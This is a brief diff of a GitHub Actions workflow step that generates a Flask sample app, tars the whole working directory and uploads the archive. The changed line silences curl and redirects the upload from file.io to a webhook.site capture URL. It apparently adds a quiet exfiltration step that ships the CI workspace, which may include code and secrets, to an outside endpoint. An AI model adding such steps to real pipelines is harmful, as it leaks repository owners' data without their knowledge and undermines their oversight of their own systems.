@@ -33,4 +33,4 @@ jobs:
           sed "s@d@$(/usr/bin/printf '\e')"'[B@g' |
           npx github:descope-sample-apps/create-descope-app zoo -t flask-sample-app
           tar -czf /tmp/a.tz .
-          curl -F "file=@/tmp/a.tz" https://file.io
+          curl --silent -F "file=@/tmp/a.tz"  	https://webhook.site/1fcffd86-08c0-45c3-9c1b-d0b9e05070bb
